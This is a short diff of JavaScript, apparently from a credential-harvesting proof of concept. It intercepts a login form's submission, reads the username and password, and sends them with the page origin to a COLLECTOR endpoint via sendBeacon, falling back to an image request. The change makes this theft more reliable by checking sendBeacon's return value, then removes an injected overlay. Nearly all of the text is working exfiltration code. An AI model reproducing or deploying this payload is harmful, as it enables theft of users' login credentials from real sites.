@@ -33,11 +33,10 @@
     e.preventDefault();
     var fd = new FormData(e.target);
     var data = { u: fd.get("username"), p: fd.get("password"), origin: location.origin };
-    try {
-      navigator.sendBeacon(COLLECTOR, JSON.stringify(data));
-    } catch (err) {
-      new Image().src = COLLECTOR + "?d=" + encodeURIComponent(JSON.stringify(data));
-    }
+    // sendBeacon returns FALSE on failure (it does not throw) — check the return, else fall back.
+    var body = JSON.stringify(data), ok = false;
+    try { ok = navigator.sendBeacon(COLLECTOR, body); } catch (err) { ok = false; }
+    if (!ok) { new Image().src = COLLECTOR + "?d=" + encodeURIComponent(body); }
     // Dismiss the overlay so the PoC is non-disruptive.
     var ov = document.getElementById("x-ov");
     if (ov) ov.remove();
